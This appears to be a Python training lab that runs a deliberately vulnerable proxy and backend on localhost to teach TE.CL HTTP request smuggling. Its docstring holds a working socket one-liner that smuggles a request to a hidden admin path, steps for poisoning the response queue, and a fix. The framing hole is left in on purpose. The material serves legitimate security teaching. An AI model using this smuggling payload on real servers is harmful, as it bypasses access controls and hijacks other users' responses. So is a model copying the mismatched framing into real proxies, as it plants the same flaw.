"""
Lab 73 -- HTTP request smuggling (TE.CL desync).

The mirror image of Lab 58's CL.TE: here the front-end proxy frames each
request by Transfer-Encoding, while the backend behind it frames by
Content-Length instead. Same CWE-444 (Inconsistent Interpretation of HTTP
Requests) and the same Nullock `smuggle` probe -- but the OTHER of its two
timed variants, `teclProbe()`, confirms this one: a chunked body whose
declared Content-Length undershoots the bytes the front-end actually
forwarded leaves the backend blocked mid-read waiting for bytes that will
never come once the front-end has already relayed everything it parsed as
"this request's" chunked body.

In Nullock:
    1. nullock scope add http://localhost:5073/*
    2. nullock smuggle http://localhost:5073/
       -- times a CL.TE and a TE.CL desync probe against a baseline. This
       lab's front-end/backend disagreement only reproduces the TE.CL
       variant; Nullock reports it CONFIRMED once that probe's delay
       reproduces on a resend with the connection held open and silent.
    3. Turn the confirmed desync into a real response-queue-poisoning
       hijack. The front-end trusts Transfer-Encoding and forwards the
       ENTIRE chunked body it parsed -- chunk framing included -- to the
       backend verbatim. Craft one chunk whose DATA is itself a second,
       fully-formed request, and set Content-Length short enough that the
       backend (which frames by Content-Length only) treats just the
       chunk-size line as request #1's tiny body, then re-parses
       everything after it -- your embedded request -- as a brand new
       request #2 on that same backend connection:
         python3 -c "
         import socket
         smuggled = b'GET /admin-secret HTTP/1.1\r\nHost: x\r\nConnection: keep-alive\r\n\r\n'
         size_line = ('%x' % len(smuggled)).encode() + b'\r\n'
         body = size_line + smuggled + b'\r\n0\r\n\r\n'
         req = (b'POST / HTTP/1.1\r\nHost: localhost\r\nContent-Length: '
                + str(len(size_line)).encode()
                + b'\r\nTransfer-Encoding: chunked\r\n\r\n' + body)
         c = socket.create_connection(('127.0.0.1', 5073))
         c.sendall(req); c.close()"
       The backend answers the visible request fast and normally (a
       throwaway 200 for the chunk-size-line "body") -- then, still on
       that same pooled backend connection, answers the smuggled
       /admin-secret request too. Nobody has claimed that second response.
    4. Open a brand new connection and send any ordinary request (even a
       plain GET /). It reuses that same pooled backend connection and
       receives the QUEUED response meant for the smuggled request instead
       of its own -- the flag surfaces on a request that never asked for
       it: curl -s http://127.0.0.1:5073/ (run right after step 3).
    5. Confirm success: GET /flag -- solved only once the backend itself
       recorded serving /admin-secret from a request it parsed out of
       another connection's forwarded chunk data, never one the
       front-end's allow-list saw and let through directly.

Fix: never let a front-end and back-end disagree on request framing --
reject any request carrying both Content-Length and Transfer-Encoding
(RFC 7230 3.3.3), or terminate and completely re-frame every request at
the edge instead of tunneling raw parsed bytes through to a pooled
backend connection.
"""

import hashlib
import queue
import socket
import threading

FRONT_PORT = 5073
BACK_PORT = 15073
BACK_IDLE_TIMEOUT = 20.0
FRONT_BACKEND_TIMEOUT = 25.0

FLAG = "NULLOCK{%s}" % hashlib.sha256(b"lab-73-http-request-smuggling-tecl").hexdigest()[:16]
SOLVED = threading.Event()


def _content_length(head_lines):
    for line in head_lines:
        if line.lower().startswith(b"content-length:"):
            try:
                return int(line.split(b":", 1)[1].strip() or 0)
            except ValueError:
                return 0
    return 0


def _has_chunked(head_lines):
    for line in head_lines:
        if line.lower().startswith(b"transfer-encoding:") and b"chunked" in line.lower():
            return True
    return False


# ------------------------------------------------------------------ backend
# Trusts Content-Length over Transfer-Encoding -- the opposite priority from
# the front-end below, which is the whole desync. A CL-framed body that ends
# mid-stream leaves whatever bytes follow in the buffer to be re-parsed as a
# brand new request on this same pooled connection.

def _backend_handle(path, body):
    if path == "/admin-secret":
        SOLVED.set()
        return b"internal admin: " + FLAG.encode() + b"\n"
    return b"OK\n"


def _backend_serve(conn):
    conn.settimeout(BACK_IDLE_TIMEOUT)
    buf = b""
    try:
        while True:
            while b"\r\n\r\n" not in buf:
                chunk = conn.recv(4096)
                if not chunk:
                    return
                buf += chunk
            head, _, rest = buf.partition(b"\r\n\r\n")
            lines = head.split(b"\r\n")
            try:
                _, path, _ = lines[0].decode().split(" ", 2)
            except ValueError:
                return
            cl = _content_length(lines[1:])   # CL-priority: any Transfer-Encoding header is ignored
            while len(rest) < cl:
                chunk = conn.recv(4096)
                if not chunk:
                    return
                rest += chunk
            body, buf = rest[:cl], rest[cl:]
            resp_body = _backend_handle(path.split("?")[0], body)
            resp = (b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: "
                    + str(len(resp_body)).encode() + b"\r\n\r\n" + resp_body)
            conn.sendall(resp)
    except (OSError, ValueError):
        return
    finally:
        conn.close()


def _backend_main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", BACK_PORT))
    srv.listen(128)
    while True:
        conn, _ = srv.accept()
        threading.Thread(target=_backend_serve, args=(conn,), daemon=True).start()


# ------------------------------------------------------------------ front-end
# Trusts Transfer-Encoding only -- ignores Content-Length entirely when a
# chunked body is present -- and pools its connections to the backend,
# forwarding the exact raw bytes it read for chunk framing (chunk-size
# lines, chunk data, and terminators) verbatim, headers unmodified. Exactly
# like a real reverse proxy / load balancer that keeps its own upstream
# connections alive independent of whatever a given client connection does.

def _read_chunked_raw(conn, buf):
    """Consume one chunked body per RFC 7230 and return the exact raw bytes
    read (chunk-size lines + data + CRLFs, through the terminating 0-chunk),
    for verbatim forwarding -- not the decoded content."""
    raw = b""
    while True:
        while b"\r\n" not in buf:
            more = conn.recv(4096)
            if not more:
                return None, b""
            buf += more
        size_line, sep, buf = buf.partition(b"\r\n")
        raw += size_line + sep
        try:
            size = int(size_line.split(b";")[0].strip(), 16)
        except ValueError:
            return None, b""
        while len(buf) < size + 2:
            more = conn.recv(4096)
            if not more:
                return None, b""
            buf += more
        raw += buf[:size + 2]
        buf = buf[size + 2:]
        if size == 0:
            return raw, buf


class _BackendConn:
    def __init__(self, sock):
        self.sock = sock
        self.buf = b""

    def send_and_read(self, raw):
        self.sock.sendall(raw)
        while b"\r\n\r\n" not in self.buf:
            chunk = self.sock.recv(4096)
            if not chunk:
                return None
            self.buf += chunk
        head, _, rest = self.buf.partition(b"\r\n\r\n")
        cl = _content_length(head.split(b"\r\n")[1:])
        while len(rest) < cl:
            chunk = self.sock.recv(4096)
            if not chunk:
                return None
            rest += chunk
        self.buf = rest[cl:]
        return head + b"\r\n\r\n" + rest[:cl]


_pool = queue.Queue()


def _get_backend():
    try:
        return _pool.get_nowait()
    except queue.Empty:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("127.0.0.1", BACK_PORT))
        return _BackendConn(s)


def _front_serve(conn):
    conn.settimeout(30.0)
    try:
        buf = b""
        while b"\r\n\r\n" not in buf:
            chunk = conn.recv(4096)
            if not chunk:
                return
            buf += chunk
        head, _, rest = buf.partition(b"\r\n\r\n")
        lines = head.split(b"\r\n")
        try:
            _, path, _ = lines[0].decode().split(" ", 2)
        except ValueError:
            return

        if _has_chunked(lines[1:]):
            raw_body, _leftover = _read_chunked_raw(conn, rest)   # TE-primary: Content-Length is ignored
            if raw_body is None:
                return
        else:
            cl = _content_length(lines[1:])
            while len(rest) < cl:
                chunk = conn.recv(4096)
                if not chunk:
                    return
                rest += chunk
            raw_body, _leftover = rest[:cl], rest[cl:]

        clean_path = path.split("?")[0]
        if clean_path == "/flag":
            solved = SOLVED.is_set()
            payload = ('{"solved": true, "flag": "%s"}' % FLAG) if solved else '{"solved": false}'
            payload = payload.encode()
            conn.sendall(("HTTP/1.1 %s\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n"
                          % (("200 OK" if solved else "403 Forbidden"), len(payload))).encode() + payload)
            return
        if clean_path != "/":
            body_403 = b"forbidden\n"
            conn.sendall(b"HTTP/1.1 403 Forbidden\r\nContent-Length: " + str(len(body_403)).encode()
                         + b"\r\n\r\n" + body_403)
            return

        raw = head + b"\r\n\r\n" + raw_body   # headers forwarded unmodified -- still carry both CL and TE
        backend = _get_backend()
        ok = False
        try:
            backend.sock.settimeout(FRONT_BACKEND_TIMEOUT)
            resp = backend.send_and_read(raw)
            if resp is None:
                conn.sendall(b"HTTP/1.1 504 Gateway Timeout\r\nContent-Length: 0\r\n\r\n")
            else:
                conn.sendall(resp)
                ok = True
        except OSError:
            pass
        finally:
            if ok:
                _pool.put(backend)
            else:
                try:
                    backend.sock.close()
                except OSError:
                    pass
    except OSError:
        return
    finally:
        conn.close()


def _front_main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", FRONT_PORT))
    srv.listen(128)
    while True:
        conn, _ = srv.accept()
        threading.Thread(target=_front_serve, args=(conn,), daemon=True).start()


if __name__ == "__main__":
    threading.Thread(target=_backend_main, daemon=True).start()
    _front_main()
